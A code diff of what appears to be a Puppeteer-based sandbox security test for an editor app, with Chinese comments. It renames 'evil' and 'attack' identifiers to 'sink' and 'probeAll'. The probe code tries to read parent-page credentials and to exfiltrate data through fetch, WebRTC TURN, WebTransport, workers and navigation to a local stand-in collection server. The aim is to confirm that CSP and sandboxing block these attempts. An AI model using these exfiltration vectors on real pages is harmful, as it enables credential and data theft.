@@ -38,7 +38,7 @@ const BASE = Number(arg('--base-port', 5720));
 const HEADFUL = argv.includes('--headful');
 const EDITOR = `http://pc.localhost:${BASE}`;
 const STAGE = `http://s1.pc.localhost:${BASE + 1}`;
-const EVIL = `http://127.0.0.1:${BASE + 7}`;
+const SINK_ORIGIN = `http://127.0.0.1:${BASE + 7}`;
 const TICKET = 'v1.PROBE-TICKET-DO-NOT-LEAK.sig';
 const SECRET = 'PROBE-CREDENTIAL-DO-NOT-LEAK';
 
@@ -61,14 +61,14 @@ const EDITOR_CSP = `frame-src ${STAGE}`;
 
 const png = (() => { const p = new PNG({ width: 4, height: 4 }); for (let i = 0; i < 16; i++) p.data.set([10, 200, 30, 255], i * 4); return PNG.sync.write(p); })();
 const uploads = new Map(); // 名 → Buffer(编辑器页录的一小段 webm)
-const evil = { connections: 0, requests: [], udp: 0 };
+const sink = { connections: 0, requests: [], udp: 0 };
 
 /* ------------------------------------------------------------------ 卡片代码(CommonJS 文本) */
 const CARD = String.raw`
-exports.attack = async function (ctx) {
+exports.probeAll = async function (ctx) {
   const out = {};
   const t = async (name, fn) => { if (ctx.only && name !== ctx.only) return; try { out[name] = await Promise.race([fn(), new Promise((r) => setTimeout(() => r("超时(8 秒没结果)"), 8000))]); } catch (e) { out[name] = "抛错:" + (e && e.name) + ":" + String(e && e.message).slice(0, 80); } };
-  const E = ctx.evil, tag = ctx.tag;
+  const E = ctx.sink, tag = ctx.tag;
   // A 读
   await t("parent.document", () => String(parent.document.title));
   await t("parent.localStorage", () => parent.localStorage.getItem("pc.credential"));
@@ -109,8 +109,8 @@ exports.attack = async function (ctx) {
   await t("worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?worker=" + tag); w.onerror = () => res("拦下"); setTimeout(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
   await t("worker-same-origin-url", () => new Promise((res) => { try { const w = new Worker("/plain-worker.js"); w.onmessage = (e) => res("跑起来了:" + e.data); w.onerror = () => res("拦下"); setTimeout(() => res("超时"), 800); } catch (e) { res("抛错:" + e.name); } }));
   await t("service-worker", () => navigator.serviceWorker.register("/plain-worker.js").then(() => "注册成功"));
-  await t("webrtc", () => new Promise((res) => { let pc; try { pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:" + ctx.evilPort }, { urls: "turn:127.0.0.1:" + ctx.evilPort + "?transport=tcp", username: "exfil-" + tag, credential: "x" }] }); } catch (e) { return res("抛错:" + e.name); } const got = []; pc.onicecandidate = (e) => { if (e.candidate) got.push(e.candidate.type); else res("候选:" + JSON.stringify(got)); }; pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)).catch((e) => res("抛错:" + e.name)); setTimeout(() => res("候选(超时):" + JSON.stringify(got)), 2500); }));
-  await t("webtransport", () => { if (typeof WebTransport !== "function") return "没有这个接口"; const w = new WebTransport("https://127.0.0.1:" + ctx.evilPort + "/wt"); return w.ready.then(() => "到达", () => "拦下"); });
+  await t("webrtc", () => new Promise((res) => { let pc; try { pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:" + ctx.sinkPort }, { urls: "turn:127.0.0.1:" + ctx.sinkPort + "?transport=tcp", username: "exfil-" + tag, credential: "x" }] }); } catch (e) { return res("抛错:" + e.name); } const got = []; pc.onicecandidate = (e) => { if (e.candidate) got.push(e.candidate.type); else res("候选:" + JSON.stringify(got)); }; pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)).catch((e) => res("抛错:" + e.name)); setTimeout(() => res("候选(超时):" + JSON.stringify(got)), 2500); }));
+  await t("webtransport", () => { if (typeof WebTransport !== "function") return "没有这个接口"; const w = new WebTransport("https://127.0.0.1:" + ctx.sinkPort + "/wt"); return w.ready.then(() => "到达", () => "拦下"); });
   // D 能干活
   await t("img-canvas-2d", () => new Promise((res, rej) => { const i = new Image(); i.onload = () => { const c = document.createElement("canvas"); c.width = c.height = 4; const g = c.getContext("2d"); g.drawImage(i, 0, 0); res(Array.from(g.getImageData(0, 0, 1, 1).data).join(",")); }; i.onerror = () => rej(new Error("图片取不到")); i.src = ctx.mediaBase + "/media/img.png"; }));
   await t("img-webgl2", async () => { const r = await fetch(ctx.mediaBase + "/media/img.png"); const bmp = await createImageBitmap(await r.blob(), { premultiplyAlpha: "none" }); return glRead(document.createElement("canvas"), bmp); });
@@ -122,7 +122,7 @@ exports.attack = async function (ctx) {
 exports.audio = async function (ctx) {
   const out = {};
   const t = async (name, fn) => { try { out[name] = await fn(); } catch (e) { out[name] = "抛错:" + (e && e.name) + ":" + String(e && e.message).slice(0, 80); } };
-  const E = ctx.evil, tag = ctx.tag;
+  const E = ctx.sink, tag = ctx.tag;
   await t("w.parent", () => typeof self.parent + "/" + typeof self.document + "/" + typeof self.localStorage);
   await t("w.indexedDB", async () => JSON.stringify((await indexedDB.databases()).map((d) => d.name)));
   await t("w.cookieStore", async () => typeof cookieStore === "undefined" ? "没有这个接口" : JSON.stringify((await cookieStore.getAll()).map((c) => c.name)));
@@ -167,7 +167,7 @@ window.addEventListener("message", async (e) => {
     const big = new Blob([new Uint8Array(64 * 1024 * 1024)]);
     const img = await (await fetch("/host-img.png")).blob();
     const t1 = performance.now();
-    f.contentWindow.postMessage({ type: "run", code: ${JSON.stringify(CARD)}, ctx: { evil: ${JSON.stringify(EVIL)}, evilPort: ${BASE + 7}, tag: mode, mediaBase: "/media-s/" + sid, nav, only }, blobs: { img, big }, sentAt: performance.timeOrigin + t1 }, ${JSON.stringify(STAGE)});
+    f.contentWindow.postMessage({ type: "run", code: ${JSON.stringify(CARD)}, ctx: { sink: ${JSON.stringify(SINK_ORIGIN)}, sinkPort: ${BASE + 7}, tag: mode, mediaBase: "/media-s/" + sid, nav, only }, blobs: { img, big }, sentAt: performance.timeOrigin + t1 }, ${JSON.stringify(STAGE)});
   }
   if (d.type === "result") { Object.assign(results, d.results); window.__done = results; }
 });
@@ -249,7 +249,7 @@ addEventListener("message", async (e) => {
   // 画面那一半:卡片代码在舞台文档里执行
   const mod = { exports: {} };
   try { new Function("require", "module", "exports", d.code)(() => { throw new Error("no modules in probe"); }, mod, mod.exports); results.evalOk = true; } catch (err) { results.evalOk = "抛错:" + err.message; }
-  if (results.evalOk === true) results.main = await mod.exports.attack(d.ctx);
+  if (results.evalOk === true) results.main = await mod.exports.probeAll(d.ctx);
   // 声音那一半:舞台起 blob Worker(继承舞台文档的策略),卡片代码在里面执行
   try {
     const src = "onmessage=async(e)=>{const m={exports:{}};new Function('require','module','exports',e.data.code)(()=>{throw new Error('no modules')},m,m.exports);postMessage(await m.exports.audio(e.data.ctx));}";
@@ -261,7 +261,7 @@ addEventListener("message", async (e) => {
   results.violationKinds = [...new Set(violations.map((v) => v.split(" ")[0]))];
   parent.postMessage({ type: "result", results }, "*");
   // 导航类放最后:它会把舞台自己带走
-  const E = d.ctx.evil, tag = d.ctx.tag, nav = d.ctx.nav;
+  const E = d.ctx.sink, tag = d.ctx.tag, nav = d.ctx.nav;
   await new Promise((r) => setTimeout(r, 200));
   try {
     if (nav === "self") location.href = E + "/x?navself=" + tag;
@@ -320,11 +320,11 @@ const stageSrv = http.createServer((req, res) => {
   send(res, 404, base, '');
 });
 
-const evilSrv = http.createServer((req, res) => { evil.requests.push(`${req.method} ${req.url}`); send(res, 200, { 'access-control-allow-origin': '*', 'content-type': req.url.includes('.js') ? 'text/javascript' : req.url.includes('.css') ? 'text/css' : req.url.includes('.png') ? 'image/png' : 'text/html' }, req.url.includes('.png') ? png : ''); });
-evilSrv.on('connection', () => { evil.connections++; });
-evilSrv.on('upgrade', (req, socket) => { evil.requests.push(`UPGRADE ${req.url}`); socket.destroy(); });
+const sinkSrv = http.createServer((req, res) => { sink.requests.push(`${req.method} ${req.url}`); send(res, 200, { 'access-control-allow-origin': '*', 'content-type': req.url.includes('.js') ? 'text/javascript' : req.url.includes('.css') ? 'text/css' : req.url.includes('.png') ? 'image/png' : 'text/html' }, req.url.includes('.png') ? png : ''); });
+sinkSrv.on('connection', () => { sink.connections++; });
+sinkSrv.on('upgrade', (req, socket) => { sink.requests.push(`UPGRADE ${req.url}`); socket.destroy(); });
 
-const evilUdp = dgram.createSocket('udp4'); evilUdp.on('message', () => { evil.udp++; });
+const sinkUdp = dgram.createSocket('udp4'); sinkUdp.on('message', () => { sink.udp++; });
 const listen = (srv, port) => new Promise((res, rej) => { srv.once('error', rej); srv.listen(port, '127.0.0.1', res); });
 
 /* ------------------------------------------------------------------ 跑 */
@@ -332,12 +332,12 @@ const fails = []; const notes = [];
 const gap = (label, ok, detail = '') => { console.log(`${ok ? '  过' : '缺口'}  ${label}${detail ? `  〔${detail}〕` : ''}`); if (!ok) notes.push(label); };
 const check = (label, ok, detail = '') => { console.log(`${ok ? '  过' : '不过'}  ${label}${detail ? `  〔${detail}〕` : ''}`); if (!ok) fails.push(label); };
 
-await listen(editorSrv, BASE); await listen(stageSrv, BASE + 1); await listen(evilSrv, BASE + 7); await new Promise((res) => evilUdp.bind(BASE + 7, '127.0.0.1', res));
+await listen(editorSrv, BASE); await listen(stageSrv, BASE + 1); await listen(sinkSrv, BASE + 7); await new Promise((res) => sinkUdp.bind(BASE + 7, '127.0.0.1', res));
 const browser = await puppeteer.launch({ headless: !HEADFUL, args: [...PROBE_CHROME_ARGS, '--window-position=-32000,-32000', '--mute-audio', ...(process.env.PC_CHROME_ARGS ? process.env.PC_CHROME_ARGS.split(' ') : [])] });
 const summary = { chrome: await browser.version() };
 try {
   const run = async (mode, nav, only) => {
-    evil.requests.length = 0; evil.connections = 0; evil.udp = 0;
+    sink.requests.length = 0; sink.connections = 0; sink.udp = 0;
     const ctx = await browser.createBrowserContext();
     const page = await ctx.newPage();
     if (process.env.PROBE_DEBUG) { page.on('console', (msg) => console.error('[console]', msg.text().slice(0, 300))); page.on('pageerror', (err) => console.error('[pageerror]', String(err).slice(0, 300))); }
@@ -349,14 +349,14 @@ try {
     await new Promise((r) => setTimeout(r, 1500));
     const alive = await page.evaluate('window.__alive()');
     const topUrl = page.url();
-    const out = { results, alive, topUrl, popups: popups.filter((u) => u.startsWith(EVIL)), evilRequests: [...evil.requests], evilConnections: evil.connections, evilUdp: evil.udp };
+    const out = { results, alive, topUrl, popups: popups.filter((u) => u.startsWith(SINK_ORIGIN)), sinkRequests: [...sink.requests], sinkConnections: sink.connections, sinkUdp: sink.udp };
     await ctx.close();
     return out;
   };
 
   const g = await run('guarded');
   const m = g.results.main ?? {}, w = g.results.worker ?? {};
-  summary.guarded = { main: m, worker: w, grant: g.results.grant, violations: g.results.violations, violationKinds: g.results.violationKinds, evilRequests: g.evilRequests, evilConnections: g.evilConnections,
+  summary.guarded = { main: m, worker: w, grant: g.results.grant, violations: g.results.violations, violationKinds: g.results.violationKinds, sinkRequests: g.sinkRequests, sinkConnections: g.sinkConnections,
     blobTransferMs: g.results.blobTransferMs, bigBlobSliceMs: g.results.bigBlobSliceMs, blobImgCanvas: g.results.blobImgCanvas };
   const leaked = (v) => typeof v === 'string' && /PROBE-|EDITOR-SECRET/.test(v);
   check('舞台里 new Function 执行卡片代码(策略带 unsafe-eval)', g.results.evalOk === true, String(g.results.evalOk));
@@ -366,7 +366,7 @@ try {
   for (const k of ['localStorage', 'indexedDB', 'document.cookie', 'cookieStore', 'opfs', 'caches', 'realm-scan', 'perf-entries']) check(`A 读本机存储与票据:${k} 里没有秘密`, !leaked(m[k]) && !/pc_rt/.test(m[k] ?? ''), m[k]);
   check('A Worker 里没有父页、文档、localStorage', w['w.parent'] === 'undefined/undefined/undefined', w['w.parent']);
   check('A Worker 的 IndexedDB、cookie 里没有秘密', !leaked(w['w.indexedDB']) && !leaked(w['w.cookieStore']), `${w['w.indexedDB']} / ${w['w.cookieStore']}`);
-  check('B 非导航类:收集站 0 个 HTTP 请求', g.evilRequests.length === 0, `请求 ${g.evilRequests.length};TCP 连接 ${g.evilConnections}、UDP 包 ${g.evilUdp}(逐个向量见下) ${g.evilRequests.slice(0, 4).join(' ; ')}`);
+  check('B 非导航类:收集站 0 个 HTTP 请求', g.sinkRequests.length === 0, `请求 ${g.sinkRequests.length};TCP 连接 ${g.sinkConnections}、UDP 包 ${g.sinkUdp}(逐个向量见下) ${g.sinkRequests.slice(0, 4).join(' ; ')}`);
   check('B 同源脚本地址起的 Worker 被 worker-src 拦下(它不继承文档的策略)', !/跑起来了/.test(m['worker-same-origin-url'] ?? ''), m['worker-same-origin-url']);
   check('B 注册 Service Worker 被拦下', /^抛错/.test(m['service-worker'] ?? ''), m['service-worker']);
   check('B 空白子框架里的 fetch 也带不走(继承策略)', !/到达/.test(m['blank-iframe-realm'] ?? ''), m['blank-iframe-realm']);
@@ -374,8 +374,8 @@ try {
   summary.vectors = {};
   for (const only of ['hint-prefetch', 'hint-preload', 'hint-preconnect', 'hint-dns-prefetch', 'hint-modulepreload', 'webrtc', 'blank-iframe-realm', 'srcdoc-iframe', 'fetch']) {
     const r = await run('guarded', null, only);
-    summary.vectors[only] = { tcp: r.evilConnections, udp: r.evilUdp, http: r.evilRequests.length, out: r.results.main?.[only] };
-    (only === 'webrtc' ? gap : check)(`B 单独跑 ${only}:收集站没收到任何东西(TCP 连接、UDP 包、HTTP 请求)`, r.evilConnections === 0 && r.evilUdp === 0 && r.evilRequests.length === 0, `tcp ${r.evilConnections} udp ${r.evilUdp} http ${r.evilRequests.length};${r.results.main?.[only] ?? ''}`);
+    summary.vectors[only] = { tcp: r.sinkConnections, udp: r.sinkUdp, http: r.sinkRequests.length, out: r.results.main?.[only] };
+    (only === 'webrtc' ? gap : check)(`B 单独跑 ${only}:收集站没收到任何东西(TCP 连接、UDP 包、HTTP 请求)`, r.sinkConnections === 0 && r.sinkUdp === 0 && r.sinkRequests.length === 0, `tcp ${r.sinkConnections} udp ${r.sinkUdp} http ${r.sinkRequests.length};${r.results.main?.[only] ?? ''}`);
   }
   check('B Worker 里 fetch / WebSocket / importScripts / 再起外部 Worker 都拦下', /^抛错/.test(w['w.fetch'] ?? '') && w['w.websocket'] !== '到达' && /^抛错/.test(w['w.importScripts'] ?? '') && w['w.nested-worker-url'] !== '已建', JSON.stringify([w['w.fetch'], w['w.websocket'], w['w.importScripts'], w['w.nested-worker-url']]));
   check('D 凭 cookie 取到的图片画进 2D 画布读得回像素', m['img-canvas-2d'] === '10,200,30,255', m['img-canvas-2d']);
@@ -388,8 +388,8 @@ try {
   summary.nav = {};
   for (const nav of ['self', 'top', 'open', 'meta', 'anchor']) {
     const r = await run('guarded', nav);
-    summary.nav[nav] = { evilRequests: r.evilRequests, alive: r.alive, topUrl: r.topUrl, popups: r.popups };
-    check(`B 导航类(${nav}):收集站 0 个请求,顶层没被带走,没开出新窗口`, r.evilRequests.length === 0 && r.topUrl.startsWith(EDITOR) && r.popups.length === 0, `请求 ${r.evilRequests.join(' ; ') || 0};舞台还活着=${r.alive}`);
+    summary.nav[nav] = { sinkRequests: r.sinkRequests, alive: r.alive, topUrl: r.topUrl, popups: r.popups };
+    check(`B 导航类(${nav}):收集站 0 个请求,顶层没被带走,没开出新窗口`, r.sinkRequests.length === 0 && r.topUrl.startsWith(EDITOR) && r.popups.length === 0, `请求 ${r.sinkRequests.join(' ; ') || 0};舞台还活着=${r.alive}`);
   }
 
   {
@@ -405,13 +405,13 @@ try {
     for (const [k, v] of Object.entries(h.out)) console.log(`        ${k}: ${v}`);
   }
   const c = await run('control', 'self');
-  summary.control = { evilRequests: c.evilRequests.length, sample: c.evilRequests.slice(0, 40) };
-  const seen = (k) => c.evilRequests.some((q) => q.includes(`${k}=control`) || q.includes(`?${k}control`));
-  for (const k of ['fetch', 'xhr', 'beacon', 'img', 'cssbg', 'script', 'iframe', 'form']) check(`C 对照组(无策略、无 sandbox):${k} 到得了收集站`, seen(k) || (k === 'navself' && c.evilRequests.some((q) => q.includes('navself'))));
+  summary.control = { sinkRequests: c.sinkRequests.length, sample: c.sinkRequests.slice(0, 40) };
+  const seen = (k) => c.sinkRequests.some((q) => q.includes(`${k}=control`) || q.includes(`?${k}control`));
+  for (const k of ['fetch', 'xhr', 'beacon', 'img', 'cssbg', 'script', 'iframe', 'form']) check(`C 对照组(无策略、无 sandbox):${k} 到得了收集站`, seen(k) || (k === 'navself' && c.sinkRequests.some((q) => q.includes('navself'))));
 } finally {
   await browser.close().catch(() => {});
-  for (const s of [editorSrv, stageSrv, evilSrv]) { s.closeAllConnections?.(); s.close(); }
-  evilUdp.close();
+  for (const s of [editorSrv, stageSrv, sinkSrv]) { s.closeAllConnections?.(); s.close(); }
+  sinkUdp.close();
 }
 console.log(JSON.stringify({ ok: fails.length === 0, fails, notes, ...summary }));
 process.exit(fails.length ? 1 : 0);
